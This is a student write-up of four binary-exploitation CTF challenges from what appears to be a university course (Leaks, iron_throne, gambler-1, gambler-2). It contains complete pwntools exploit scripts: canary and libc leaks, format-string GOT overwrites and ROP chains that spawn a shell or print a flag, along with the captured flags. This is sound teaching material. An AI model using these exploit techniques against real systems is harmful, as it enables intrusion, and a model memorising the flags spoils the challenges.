This document contains the write-ups for the four challenges of **Assignment 9**.

| Problem ID | Lab Name    | Captured Flag                                         | Steps                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ---------- | ----------- | ----------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Problem 1  | Leaks       | `fsuCTF{ThereIsALeakInThe`<br>`Function}`             | - Read the canary leaked by the program in the first printed line<br>- Send `%2$p` as the fgets input to leak the runtime address of `printf` via the format string vulnerability<br>- Compute `libc_base` and derive the addresses of `system`, `/bin/sh`, `pop rdi ; ret`, and `ret`<br>- Send the overflow payload through `scanf`: 136 bytes padding + canary + saved rbp + ROP chain → shell                                                                     |
| Problem 2  | iron_throne | `fsuCTF{4_l4nni573r_41w4y5_`<br>`0verwri735_hi5_go7}` | - Send `/bin/sh` as the name input<br>- Read the leaked runtime address of `system` printed by the program<br>- Use `fmtstr_payload` to write the address of `system` into the GOT entry of `fputs` at `0x404010` (offset 18)<br>- Send the payload as the message → `fputs(name, stdout)` calls `system("/bin/sh")` → shell                                                                                                                                          |
| Problem 3  | gambler-1   | `fsuCTF{if_y0u_wan7_t0_l`<br>`earn_7he_gameb0y}`      | - Parse the leaked address of `main` from the welcome message and compute the PIE base<br>- Build a ROP chain: `pop rdi ; ret` → `3000000000` → `payout` → `buy_flag`<br>- Send `-1` as the wager padded with 38 bytes + ROP chain via `scanf` overflow → `buy_flag` prints the flag                                                                                                                                                                                  |
| Problem 4  | gambler-2   | `fsuCTF{y0u_g077a_1earn_`<br>`t0_pl4y_i7_righ7}`      | - Send `%11$p` as the name to leak a PIE address via the format string vulnerability in `printf(prefix)`<br>- Compute `pie_base` and derive the addresses of the target inside `buy_flag` (past the balance check), a `ret` gadget, and a fake RBP pointing to BSS<br>- Bet 1 and choose H to trigger the prefix print<br>- Send the overflow payload (32 bytes padding + fake RBP + `ret` gadget + target) as the next wager, then `-1` → `buy_flag` prints the flag |

---

### ==PROBLEM 1== - Leaks
In this challenge we are given a `.tar.gz` archive and a netcat connection.

## 1. Analysis
We start by unpacking the archive to see what we are working with `tar -xvzf leak.tar.gz`:

![Pasted image 20260315192226.png](../_img/Pasted%20image%2020260315192226.png)

We get the binary, the source code, and the exact versions of libc and the dynamic linker that the server uses.

```c
#include <stdio.h>
void vuln(int (*x)(const char*, ...)) {
    char buffer[128];
    void *rbp;
    __asm__("mov %%rbp, %0" : "=r"(rbp));
    printf("Little birdie says '%p'\n", *(long long *)(rbp-8));
    x("Isn't it cool that you can pass functions as arguments?\n");
    fgets(buffer, sizeof(buffer), stdin);
    x(buffer);
    x("What function should I pass in next time? \n");
    scanf("%s",buffer);
}
int main(int argc, char **argv)
{
    vuln(printf);
    return 0;
}
```

We notice several things:

- The `printf("Little birdie says '%p'\n", *(long long *)(rbp-8))` manually reads the value of `rbp` using inline assembly and then prints whatever is stored 8 bytes below it.
- **`fgets(buffer, sizeof(buffer), stdin)`** reads exactly 128 bytes into a 128-byte buffer.
- **`x(buffer)`** calls `x`, which is `printf`, with the buffer as the format string. This can be a format string vulnerability. If we put something like `%p %p %p` in the buffer, `printf` will interpret them and might print values from the stack.
- **`scanf("%s", buffer)`** reads from stdin with no size limit into a 128-byte buffer. This is a classic stack buffer overflow.

Then we check the binary protections using `checksec`.

![Pasted image 20260315193243.png](../_img/Pasted%20image%2020260315193243.png)

This tells us:

- **PIE**: the binary loads at a random base address each run. We need a leak to know where things are.
- **Canary**: there is a secret value placed on the stack between the buffer and the return address. If we overwrite it without knowing its value, the program detects it and crashes before returning.
- **NX**: we can not execute shellcode on the stack. We need to reuse existing code.

Then we give permissions to the executable with `chmod +x` and run the program.

![Pasted image 20260315193905.png](../_img/Pasted%20image%2020260315193905.png)

The value printed ends in `00`. Apparently, stack canaries in Linux always end in a null byte, this is to stop string functions from copying them.

We confirm this by looking at the disassembly of `vuln`:

![Pasted image 20260315194709.png](../_img/Pasted%20image%2020260315194709.png)

The compiler stores the canary at `rbp-0x8`. The program prints `*(rbp-8)`. They are the same location. The program is leaking its own canary.

With the canary covered, we still need to break ASLR to find where libc is loaded. For that we turn to the format string vulnerability. We send a string of `%p` specifiers and see what gets printed:

![Pasted image 20260315195804.png](../_img/Pasted%20image%2020260315195804.png)

We spot several addresses starting with `0x7f`, which is the range where Linux loads shared libraries. We also see that position 27 matches the canary value exactly. Position 2 (`0x7f1b177f81c0`) and position 3 (`0x7f1b179867a0`) look like libc addresses.

To figure out which symbol those addresses correspond to, we open GDB and set a breakpoint at `vuln`.

```
gef➤ break vuln
```

After stopping, we check the mappings:

![Pasted image 20260315200951.png](../_img/Pasted%20image%2020260315200951.png)

The output shows libc loaded at base `0x00007ffff7da2000`. We also notice in the registers at the breakpoint:

![Pasted image 20260315202852.png](../_img/Pasted%20image%2020260315202852.png)

`printf` is at `0x00007ffff7dfd1c0`. Subtracting the base:

```
0x7ffff7dfd1c0 - 0x7ffff7da2000 = 0x5b1c0
```

We then run again inside GDB with the `%p` payload and confirm that position 2 prints `0x7ffff7dfd1c0`: the address of `printf`. So position 2 of the format string gives us a libc address we can use to compute the base.

Now that we know we can leak `printf`'s address at runtime, we need the offsets of the symbols inside the server's libc to compute the rest. The server provided its own `libc.so.6`. This matters because the memory offset of every function inside libc is fixed for a given version: it does not change between runs. What changes with ASLR is the base address where libc gets loaded, but the distance from that base to any given symbol is always the same. So if we know where one symbol is at runtime, we can calculate where all the others are:

```
libc_base = leaked_printf - offset_of_printf_in_libc
system_addr = libc_base + offset_of_system_in_libc
```

So we need three things from the provided libc:

- the offset of `printf`
- the offset of `system`
- the offset of the string `/bin/sh` (the argument we want to pass to `system`)

_We also need a ROP gadget to load that argument into `rdi`, since the first argument is passed there._

We get the function offsets using `readelf`:

![Pasted image 20260315210801.png](../_img/Pasted%20image%2020260315210801.png)

The string `/bin/sh` is stored somewhere inside libc itself - it is used internally. We find it using `strings`.

![Pasted image 20260315210836.png](../_img/Pasted%20image%2020260315210836.png) _The `-t x` flag prints the offset in hex._

So `/bin/sh` lives at offset `0x1da4ab` inside the libc file.

For the gadget, we need `pop rdi ; ret` to put the address of `/bin/sh` into `rdi` before calling `system`. We search for it inside the provided libc:

![Pasted image 20260315211058.png](../_img/Pasted%20image%2020260315211058.png)

This gadget is at offset `0x11b8fa` inside libc, so at runtime it will be at `libc_base + 0x11b8fa`. We also note that the `ret` instruction of this gadget is at `0x11b8fb`. We will use it later as a standalone `ret` to align the stack.

To summarise, these are all the offsets we need:

| Symbol        | Offset     |
| ------------- | ---------- |
| printf        | `0x64100`  |
| system        | `0x5c480`  |
| /bin/sh       | `0x1da4ab` |
| pop rdi ; ret | `0x11b8fa` |

At runtime: `libc_base = leaked_printf - 0x64100`

The last thing we need before writing the exploit is the exact overflow offset. We disassemble `vuln` and look for where the buffer is referenced:

![Pasted image 20260315211827.png](../_img/Pasted%20image%2020260315211827.png)

The stack layout for `scanf` is:

```
[rbp-0x90]  buffer (start)
   ...
[rbp-0x08]  canary
[rbp+0x00]  saved rbp
[rbp+0x08]  return address
```

Distance from buffer to canary: `0x90 - 0x08 = 0x88 = 136 bytes`.

The goal is to call `system("/bin/sh")`. The first argument to a function goes in `rdi`. So we need to:

1. Pop the address of `/bin/sh` into `rdi` using the `pop rdi ; ret` gadget.
2. Call `system`.

We also need a bare `ret` gadget before `system` to align the stack to 16 bytes.

Final payload for `scanf`:

```
[136 bytes padding] + [canary] + [8 bytes saved rbp] + [pop rdi] + [/bin/sh addr] + [ret] + [system addr]
```

## 2. Solution Strategy
Now that we have all the required information, the steps to get a shell on the server will be:

1. Read the canary from the "Little birdie says" line.
2. Send `%2$p` as the `fgets` input to leak the address of `printf` via the format string vulnerability.
3. Compute `libc_base = leaked_printf - 0x64100`.
4. Compute the addresses of `system`, `/bin/sh`, `pop rdi ; ret`, and `ret`.
5. Send the overflow payload through `scanf` and get a shell.

## 3. Execution and Flag
The final script:

```python
from pwn import *

PRINTF_OFFSET  = 0x64100
SYSTEM_OFFSET  = 0x5c480
BINSH_OFFSET   = 0x1da4ab
POP_RDI_OFFSET = 0x11b8fa
RET_OFFSET     = 0x11b8fb
BAD_BYTES      = set(b'\x09\x0a\x0b\x0c\x0d\x20')

while True:
    p = remote('ctf.cs.fsu.edu', 65080)

    canary = int(p.recvline().split(b"'")[1], 16)
    canary_bytes = p64(canary)

    if any(b in BAD_BYTES for b in canary_bytes):
        p.close()
        continue

    p.recvline()
    p.sendline(b'%2$p')
    libc_base = int(p.recvline().strip(), 16) - PRINTF_OFFSET

    system  = libc_base + SYSTEM_OFFSET
    binsh   = libc_base + BINSH_OFFSET
    pop_rdi = libc_base + POP_RDI_OFFSET
    ret     = libc_base + RET_OFFSET

    rop = [pop_rdi, binsh, ret, system]
    if any(b in BAD_BYTES for addr in rop for b in p64(addr)):
        p.close()
        continue

    payload  = b'A' * 136 + canary_bytes + b'B' * 8
    payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)

    p.recvline()
    p.sendline(payload)
    p.interactive()
    break
```

The script connects to the server and attempts the exploit in a loop. On each iteration:

1. it reads the canary from the first line
2. checks that none of its bytes would cause `scanf` to stop reading early and retries if they do
3. it then sends `%2$p` as the `fgets` input to trigger the format string leak and reads back the address of `printf`, which lets it compute `libc_base` and from there the runtime addresses of `system`, `/bin/sh`, and the gadgets.
4. once everything is clean, it builds the payload:
    - 136 bytes of padding to reach the canary
    - the canary itself so the stack check passes
    - 8 bytes to overwrite the saved `rbp`
    - the ROP chain - `pop rdi` to load `/bin/sh` into `rdi`
    - a bare `ret` to align the stack to 16 bytes
    - `system`
5. It sends the payload through `scanf` and drops into an interactive shell.

Running it gives us an interactive shell, where we can easily retrieve the flag:

![Pasted image 20260315231818.png](../_img/Pasted%20image%2020260315231818.png)

Flag: `fsuCTF{ThereIsALeakInTheFunction}`

---

### ==PROBLEM 2== - iron_throne
For this challenge we are given a `.tar.gz` archive and a netcat connection. The description reads: _"I wish I could overwrite the actual ending :("_. That hint about overwriting something is going to be important later.

## 1. Analysis
We start by unpacking the archive:

```bash
tar -xvzf iron_throne.tar.gz
```

We get two files: the binary `iron_throne` and its source code `iron_throne.c`.

We run `file` and `checksec` to understand what we are dealing with:

![Pasted image 20260315233940.png](../_img/Pasted%20image%2020260315233940.png)

![Pasted image 20260315234010.png](../_img/Pasted%20image%2020260315234010.png)

A few things stand out:

- **No PIE** - the binary always loads at the fixed base address `0x400000`. This means addresses inside the binary are constant across every run, which is very convenient.
- **Stack Canary** - there is a secret value on the stack that guards the return address. A classic buffer overflow that tries to overwrite the return address will corrupt the canary and crash the program before it can return. This rules out simple stack overflows.
- **NX** - the stack is not executable, so we cannot write shellcode there.
- **Partial RELRO** - the GOT (Global Offset Table) is writable. This will matter.

We then read the source code:

```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[], char *envp[]) {
    char msg[200];
    char name[64];
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("===========================================================\n");
    printf("                        IRON THRONE                        \n");
    printf("===========================================================\n");
    printf("When you play the game of thrones, you win or you segfault.\n");
    printf("The mad king has left the Iron Throne unprotected.\n");
    printf("A raven appears and asks for your name: ");
    scanf("%63s", name);
    printf("It presents you with a letter that reads: \"%p\"\n", system);
    printf("What do you say to the raven? ");
    scanf("%199s", msg);
    printf("\nThe raven squawks your message back: ");
    printf(msg);
    printf("\nIt flies off and carries your decree to the Master of Whispers...\n");
    printf("Your claim echoes through the Great Hall: ~~");
    fputs(name, stdout);
    fputs("~~\n", stdout);
    return 0;
}
```

Reading through the code we notice three things that look interesting:

1. First, the program prints `system` directly as a pointer with `%p`. This means every time the program runs it prints the exact runtime address of `system()`. Since ASLR randomizes where libc is loaded each run, normally we would have to find a way to leak a libc address. Here the program does it for us.
2. Second, `printf(msg)` is called without a format string. The buffer `msg` is passed directly as the first argument to `printf`. This is a **format string vulnerability**. When `printf` receives a format string it looks for conversion specifiers like `%p`, `%x`, or `%n`. If we control that string, we can use `%n` to write arbitrary values into arbitrary memory addresses.
3. Third, the last two function calls are `fputs(name, stdout)` and then `fputs("~~\n", stdout)`. We control `name` (the first input), and `fputs` is a library function whose address gets looked up at runtime through the GOT.

The GOT is a table in memory that holds the real runtime addresses of library functions. When the program calls `fputs`, it jumps through the GOT entry for `fputs` to find out where the function is in memory. If we overwrite that entry with the address of `system`, the next call to `fputs(name, stdout)` will instead execute `system(name)`. If we set `name` to `/bin/sh`, we get a shell.

We run the binary to confirm our understanding of the flow:

![Pasted image 20260315234338.png](../_img/Pasted%20image%2020260315234338.png)

The leaked address is the runtime address of `system`.

Now we need two more things to build the exploit: 
- the GOT address of `fputs`
- the position (offset) of our `msg` buffer within the format string argument stack

We get the GOT address of `fputs` with `objdump`:

![Pasted image 20260315234506.png](../_img/Pasted%20image%2020260315234506.png)

The GOT entry for `fputs` is at the fixed address `0x404010`. Since there is no PIE, this address is the same on every run.

To find the format string offset we need to know at which stack position our `msg` buffer starts. We run the binary with `/bin/sh` as the name and a probe string as the message:

![Pasted image 20260315234852.png](../_img/Pasted%20image%2020260315234852.png)

We do not see `0x4141414141414141` (our eight A's) in positions 1 through 16. We extend the probe range:

![Pasted image 20260315235051.png](../_img/Pasted%20image%2020260315235051.png)

`0x4141414141414141` shows up at position **18**. That is our offset.

## 2. Solution Strategy
With all the information we need, the steps are:

1. Send `/bin/sh` as the name.
2. Read the leaked address of `system` printed by the program.
3. Use `fmtstr_payload` from pwntools to generate a format string payload that writes the address of `system` into `0x404010` (the GOT entry of `fputs`), using offset 18.
4. Send that payload as the message.
5. When the program reaches `fputs(name, stdout)`, it will look up the GOT, find `system` there instead, and call `system("/bin/sh")`.

## 3. Execution and Flag
The script for the remote server:

```python
from pwn import *

context.arch = 'amd64'

fputs_got = 0x404010
fmt_offset = 18

p = remote('ctf.cs.fsu.edu', 65039)

p.sendlineafter(b'A raven appears and asks for your name: ', b'/bin/sh')

p.recvuntil(b'"')
system_addr = int(p.recvuntil(b'"')[:-1], 16)
log.info(f'system @ {hex(system_addr)}')

payload = fmtstr_payload(fmt_offset, {fputs_got: system_addr}, write_size='short')
p.sendlineafter(b'What do you say to the raven? ', payload)

p.interactive()
```

The script reads the leaked address of `system` directly from the program's output and passes it to `fmtstr_payload` along with the GOT address and our offset. `fmtstr_payload` takes care of building the actual format string with the right `%c` padding and `%hn` writes to place the correct bytes at `0x404010`. The `write_size='short'` parameter makes it write two bytes at a time, which keeps the payload shorter and more reliable.

After sending the payload, `printf(msg)` processes our format string and writes the address of `system` into the GOT entry for `fputs`. Then the program reaches:

```c
fputs(name, stdout);
```

It looks up `fputs` in the GOT, finds `system` there, and calls `system("/bin/sh")`. We then get an interactive shell:

![Pasted image 20260315235241.png](../_img/Pasted%20image%2020260315235241.png)

Flag: `fsuCTF{4_l4nni573r_41w4y5_0verwri735_hi5_go7}`

---

### ==PROBLEM 3== - gambler-1
For this challenge we are given a `.tar.gz` archive and a netcat connection at `ctf.cs.fsu.edu:65045`.

## 1. Analysis
We start by extracting the archive:

```bash
tar -xvzf gambler_1.tar.gz
```

We get two files: the binary `gambler_1` and its source code `gambler_1.c`.

We run `file` and `checksec` to understand what we are dealing with:

![Pasted image 20260316000643.png](../_img/Pasted%20image%2020260316000643.png)

![Pasted image 20260316000720.png](../_img/Pasted%20image%2020260316000720.png)

A few things stand out from `checksec`:

- **No canary** - there is nothing protecting the return address on the stack. If we find a buffer overflow, nothing stops us from overwriting it.
- **NX enabled** - the stack is not executable, so we can not inject and run shellcode directly.
- **PIE enabled** - the binary loads at a random base address every run. This means we can not use hardcoded addresses; we need a leak to know where things are in memory.
- **Not stripped** - function names are still in the binary, which makes analysis much easier.

Then we read the source code carefully:

```c
long balance;

long payout(long wager) {
    long reward = wager + wager/2;
    balance += reward;
    return reward;
}

void buy_flag() {
    char flag[64];
    FILE *flagFile;
    int nRead;
    if (balance >= 4294967296) {
        flagFile = fopen("./flag.txt","r");
        if (flagFile) {
            nRead = fread(flag, 1, 63, flagFile);
            flag[nRead] = '\0';
            printf("Here's your flag: %s\n", flag);
        } else {
            printf("Could not open flag.txt.\n");
        }
    } else {
        printf("You do not have the funds!\n");
    }
}

void high_and_low(long wager) {
    char option;
    int result;
    ...
}

void gift() {
    __asm__("pop %rdi; ret;");
}

int main(int argc, char *argv[], char *envp[]) {
    char bet[20];
    long wager;
    setvbuf(stdout, NULL, _IONBF, 0);
    srand(time(NULL));
    printf("Welcome to Not-A-Casino, house of the %p! ...\n", main);
    balance = 300;
    while (balance > 50) {
        printf("What's your wager? ");
        scanf("%s", bet);
        wager = strtol(bet, NULL, 10);
        getchar();
        if (wager == -1) {
            printf("Goodbye!\n");
            break;
        }
        high_and_low(wager);
    }
}
```

Several things catch our attention:

The program prints the runtime address of `main`. Since PIE is enabled and addresses change every run, this is crucial: with this value we can calculate where the binary is loaded in memory and derive the address of any function inside it.

![Pasted image 20260316000938.png](../_img/Pasted%20image%2020260316000938.png)

The second thing we notice is the input handling in `main`:

![Pasted image 20260316001109.png](../_img/Pasted%20image%2020260316001109.png)

`bet` is only 20 bytes, but `scanf("%s", ...)` reads input until it finds whitespace with no length limit. This is a classic stack buffer overflow. Combined with the lack of a canary, we can overwrite the return address of `main`.

The third thing is `buy_flag`. This function reads and prints the flag, but it is never called anywhere in the program. It also checks that `balance >= 4294967296` (which is 2^32) before doing anything. We start with 300, so reaching that through normal gameplay is not realistic.

The fourth thing is this:

![Pasted image 20260316001228.png](../_img/Pasted%20image%2020260316001228.png)

This is an inline assembly gadget placed there on purpose by the author. The instruction `pop %rdi` loads the top of the stack into the `rdi` register, which in 64-bit Linux is the register used to pass the first argument to a function. The `ret` after it then transfers execution to whatever address is on top of the stack next.

Finally, `payout` is a function that adds money to `balance`. It takes a wager as argument and increases `balance` by `wager + wager/2`. If we could call it with a large enough number, `balance` would exceed 4294967296 and `buy_flag` would print the flag.

## 2. Solution Strategy
Our first idea is to skip the `if` check in `buy_flag` entirely by jumping past it. Looking at the disassembly:

![Pasted image 20260316001542.png](../_img/Pasted%20image%2020260316001542.png)

If we jump directly to offset `0x1234`, we skip the check completely. We try this first.

For the overflow, we look at the disassembly of `main` to figure out the exact offset from `bet` to the return address:

![Pasted image 20260316001831.png](../_img/Pasted%20image%2020260316001831.png)

This gives us the following stack layout:

```
rbp - 0x20  →  bet[0]        (where scanf writes)
rbp + 0x00  →  saved rbp     (8 bytes)
rbp + 0x08  →  return address (what we want to overwrite)
```

The distance from `bet` to the return address is `0x20 + 0x08 = 40 bytes`. We send `-1` as the wager so `strtol` returns -1 and the program hits the `break` and falls through to `ret`. We need 2 bytes for `-1` and then 38 more bytes of padding to reach the return address.

We also remember that NX is enabled, which means `fopen` (called inside `buy_flag`) requires the stack to be aligned to 16 bytes when it is called. When we redirect execution through a ROP chain, that alignment can be off by 8 bytes. The standard fix is to add a single `ret` gadget before the target. We find one:

![Pasted image 20260316001938.png](../_img/Pasted%20image%2020260316001938.png)

The first exploit attempt looks like this:

```python
from pwn import *

MAIN_OFFSET   = 0x1446
TARGET_OFFSET = 0x1234
RET_OFFSET    = 0x101a

p = remote('ctf.cs.fsu.edu', 65045)

bienvenida = p.recvline()
leaked_main = int(bienvenida.split(b'0x')[1].split(b'!')[0], 16)

base       = leaked_main - MAIN_OFFSET
target     = base + TARGET_OFFSET
ret_gadget = base + RET_OFFSET

payload  = b"-1" + b"A" * 38 + p64(ret_gadget) + p64(target)

p.recvuntil(b"What's your wager? ")
p.sendline(payload)
p.interactive()
```

We run it and get:

```
[+] Opening connection to ctf.cs.fsu.edu on port 65045: Done
[*] Switching to interactive mode
Goodbye!
[*] Got EOF while reading in interactive
```

The `Goodbye!` appears, which means the overflow is working and the break is triggered. But the connection closes immediately and we do not get the flag. The program is crashing inside `buy_flag` without printing anything.

We go back and look more carefully at what happens when we jump to `0x1234`. At that point `rbp` has been corrupted by our overflow (we filled it with `A`s), so when `buy_flag` tries to use `rbp` to set up local variables like `flagFile` at `rbp-0x8` or the `flag` buffer at `rbp-0x50`, it is reading and writing to garbage memory. That causes the crash.

We rethink the approach. Instead of skipping the `if`, we should call `buy_flag` from its proper beginning so its prologue sets up a valid stack frame. But then `balance` needs to be large enough to pass the check.

This is where `payout` and the `pop %rdi; ret` gadget from `gift` come into play. We can build a short ROP chain:

1. Use `pop %rdi; ret` to load a large number into `rdi`.
2. Call `payout` with that argument - it will add `wager + wager/2` to `balance`.
3. Call `buy_flag` from the beginning - the prologue runs correctly, `balance` is now above the threshold, and the flag gets printed.

We need to check that the number we pass is big enough. `payout(3_000_000_000)` would add `3,000,000,000 + 1,500,000,000 = 4,500,000,000` to `balance`, giving a final balance of `4,500,000,300`, which is well above `4,294,967,296`. That works.

We look up the offsets we need from `objdump`:

```
000000000000143d <gift>:
    143d:   push   %rbp
    143e:   mov    %rsp,%rbp
    1441:   pop    %rdi        ← our gadget is here
    1442:   ret

00000000000011d9 <payout>:
    11d9:   push   %rbp
    ...

000000000000121b <buy_flag>:
    121b:   push   %rbp
    ...
```

The ROP chain we want on the stack after the padding is:

```
[ address of pop %rdi; ret ]
[ 3000000000               ]   ← this gets popped into rdi
[ address of payout        ]   ← called with rdi = 3000000000
[ address of buy_flag      ]   ← called after payout returns, balance is now huge
```

## 3. Execution and Flag
The final script:

```python
from pwn import *

MAIN_OFFSET     = 0x1446
POP_RDI_OFFSET  = 0x1441
PAYOUT_OFFSET   = 0x11d9
BUY_FLAG_OFFSET = 0x121b

p = remote('ctf.cs.fsu.edu', 65045)

bienvenida = p.recvline()
leaked_main = int(bienvenida.split(b'0x')[1].split(b'!')[0], 16)

base     = leaked_main - MAIN_OFFSET
pop_rdi  = base + POP_RDI_OFFSET
payout   = base + PAYOUT_OFFSET
buy_flag = base + BUY_FLAG_OFFSET

payload  = b"-1"            # strtol returns -1 → break → main hits ret
payload += b"A" * 30        # padding to saved rbp
payload += b"B" * 8         # overwrite saved rbp
payload += p64(pop_rdi)     # return address → pop %rdi; ret
payload += p64(3000000000)  # argument for payout: loaded into rdi
payload += p64(payout)      # payout(3_000_000_000) → balance += 4_500_000_000
payload += p64(buy_flag)    # buy_flag() from the start → if passes → flag

p.recvuntil(b"What's your wager? ")
p.sendline(payload)
p.interactive()
```

When we run the script against the server:

![Pasted image 20260316002201.png](../_img/Pasted%20image%2020260316002201.png)

The chain executes in order: `pop_rdi` loads 3,000,000,000 into `rdi`, then `payout` uses that as the wager and raises `balance` far above 4,294,967,296, and finally `buy_flag` runs from its proper prologue, finds the balance check satisfied, and prints the flag.

Flag: `fsuCTF{if_y0u_wan7_t0_learn_7he_gameb0y}`

---

### ==PROBLEM 4== - gambler-2
For this challenge we are given a `.tar.gz` archive and a netcat connection at `ctf.cs.fsu.edu:65046`. 

## 1. Analysis
We start by extracting the archive:

```bash
tar -xvzf gambler_2.tar.gz
```

We get two files: the compiled binary `gambler_2` and its C source code `gambler_2.c`. Having the source is very helpful.

We run `file` and `checksec` to understand the binary before touching anything else:

![Pasted image 20260316005059.png](../_img/Pasted%20image%2020260316005059.png)

![Pasted image 20260316005136.png](../_img/Pasted%20image%2020260316005136.png)

A few things to note here. 
- **PIE** means the binary loads at a different base address every run, so we can not hardcode any address.
- **No canary** means we can overflow the stack freely without having to leak a secret value first. 
- **NX** means the stack is not executable, so we can not inject shellcode directly; we have to reuse code that already exists in the binary.

We read the source code carefully. A few things catch our attention.

The first is the input flow in `main`:

![Pasted image 20260316005317.png](../_img/Pasted%20image%2020260316005317.png)

And then, inside `high_and_low`:

![Pasted image 20260316005400.png](../_img/Pasted%20image%2020260316005400.png)

The name we enter gets embedded into `prefix`, and then `prefix` is passed directly to `printf` as the format string. This is a **format string vulnerability**. When `printf` receives a format string it controls, it reads arguments from the stack according to the specifiers it finds. If we put something like `%p.%p.%p` as our name, `printf` will read values off the stack and print them. This is the "leak" the problem statement was hinting at.

The second thing is the wager input in `main`:

![Pasted image 20260316005506.png](../_img/Pasted%20image%2020260316005506.png)

`bet` is 20 bytes, but `scanf("%s", ...)` reads until whitespace with no length limit. This is a **stack buffer overflow**. Combined with the absence of a stack canary, we can overwrite the saved return address of `main`.

The third thing is `buy_flag`. This function reads and prints the flag, but it is never called anywhere. It also has a condition:

![Pasted image 20260316005611.png](../_img/Pasted%20image%2020260316005611.png)

We start with 300. Getting there through normal gameplay is not realistic. So the goal is to redirect execution to this function through the overflow.

We also notice:

![Pasted image 20260316005640.png](../_img/Pasted%20image%2020260316005640.png)

This is a gadget placed there intentionally.

To confirm the format string vulnerability, we run the binary locally and enter `%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p` as our name, then bet `1` and choose `H`:

![Pasted image 20260316005922.png](../_img/Pasted%20image%2020260316005922.png)

We get a list of values printed inside the brackets. We spot values starting with `0x561d`, which is the range where the binary itself is loaded. Specifically, position 11 (`0x561d0f3e95c6`) ends in `5c6`.

We check the offsets in the binary using `objdump`:

![Pasted image 20260316010106.png](../_img/Pasted%20image%2020260316010106.png)

- `main` is at offset `0x146a`
- `buy_flag` is at offset `0x122b`

The address at position 11 of the leak ends in `5c6`. Looking at the disassembly, offset `0x15c6` is a return address inside the `main` loop (the instruction right after the call to `high_and_low`). 

![Pasted image 20260316010400.png](../_img/Pasted%20image%2020260316010400.png)

The value at position 11 is a return address sitting on the stack inside `main`'s execution, and its lower bytes match offset `0x15c6`. We can use this to compute the PIE base:

```
pie_base = leak_pos11 - 0x15c6
```

Now we look at the disassembly of `buy_flag` to understand the balance check:

![Pasted image 20260316010553.png](../_img/Pasted%20image%2020260316010553.png)

If we jump directly to `0x1244` we skip the check completely. This becomes our initial target.

To find the overflow offset we load the binary in GDB and use a cyclic pattern. 

![Pasted image 20260316010645.png](../_img/Pasted%20image%2020260316010645.png)

We enter `test` as the name, send the pattern as the wager, then send `-1` to make `main` return (which is when the overwritten return address gets used):

After running the program crashes and GDB reports `$rbp = 0x6161616161616561`. We check the offset:

![Pasted image 20260316010916.png](../_img/Pasted%20image%2020260316010916.png)

GEF says 31 bytes to reach the saved RBP. That means the return address is at `31 + 8 = 39` bytes. However, looking at the actual crash output more carefully, RSP points to the middle of our pattern in a way that suggests an off-by-one in GEF's calculation. We verify by looking at what is on the stack when `main` tries to execute `ret` and confirm the correct offsets are:

```
[32 bytes padding] [8 bytes saved RBP] [return address]
```

## 2. Solution Strategy
The plan is:

1. Send `%11$p` as the name. This tells `printf` to print specifically the 11th argument, which is the PIE address we identified earlier. This is cleaner than printing all positions at once.
2. Parse the leak from inside the brackets `[...]` in the prefix output.
3. Compute `pie_base = leak - 0x15c6`.
4. Compute `target = pie_base + 0x1244` (inside `buy_flag`, past the balance check).
5. Bet `1` and choose `H` to get through the first round (needed for the prefix to print).
6. On the next wager prompt, send the overflow payload: 32 bytes of padding, then a fake saved RBP, then a `ret` gadget for stack alignment, then `target`.
7. Send `-1` on the following prompt to trigger the `break` and make `main` return, executing our chain.

The **stack alignment** issue: NX is enabled and `buy_flag` calls `fopen`, which is a libc function that requires the stack to be aligned to 16 bytes when it is called. When we redirect execution with a raw `ret`, the alignment can be off by 8 bytes. The standard fix is to insert a single `ret` gadget before our target so the alignment is corrected. We find one with `ROPgadget`:

```bash
ROPgadget --binary gambler_2 | grep ": ret"
0x000000000000101a : ret
```

We use `pie_base + 0x101a`.

The **fake RBP** issue: when we overwrite the saved RBP with padding bytes (`0x4141...`), `buy_flag`'s prologue sets up its stack frame relative to RBP. When it tries to write the `FILE*` from `fopen` to `rbp-0x8`, it writes to a garbage address and the program crashes. We need to give RBP a valid writable address. The binary has global variables in the BSS section. We use `pie_base + 0x4160`, which points into the BSS area. This means:

- `rbp-0x8` = `pie_base + 0x4158` - a valid writable address for the `FILE*`
- `rbp-0x50` = `pie_base + 0x4110` - a valid writable address for the flag buffer

The final payload structure is:

```
[32 bytes padding] + [fake_rbp] + [ret_gadget] + [target]
```

## 3. Execution and Flag
We write the exploit with pwntools. The first version uses offset 39 and no fake RBP, which crashes. Then we try 40 with the `ret` gadget but still no fake RBP, which also crashes. After adding the fake RBP pointing to BSS, the exploit works locally.

We test locally by creating a `flag.txt`:

```bash
echo "flag{test_flag_local}" > flag.txt
python3 exploit_local.py
```

Output:

```
[*] Leak (pos 11): 0x55a258bbf5c6
[*] PIE base: 0x55a258bbe000
[*] Target: 0x55a258bbf244
Here's your flag: flag{test_flag_local}
```

The exploit works. We now run it against the remote server.

```python
from pwn import *

elf = ELF('./gambler_2')
context.binary = elf
p = remote('ctf.cs.fsu.edu', 65046)

p.sendlineafter(b'Enter your name: ', b'%11$p')
p.sendlineafter(b"What's your wager? ", b'1')

p.recvuntil(b'[')
leak = int(p.recvuntil(b']', drop=True), 16)

pie_base   = leak - 0x15c6
target     = pie_base + 0x1244
ret_gadget = pie_base + 0x101a
fake_rbp   = pie_base + 0x4160

p.sendlineafter(b'High or Low? (H/L) ', b'H')

payload = b'A' * 32 + p64(fake_rbp) + p64(ret_gadget) + p64(target)

p.sendlineafter(b"What's your wager? ", payload)
p.sendlineafter(b"What's your wager? ", b'-1')

p.interactive()
```

Running it against the server gives us the flag.

![Pasted image 20260316011209.png](../_img/Pasted%20image%2020260316011209.png)

Flag: `fsuCTF{y0u_g077a_1earn_t0_pl4y_i7_righ7}`

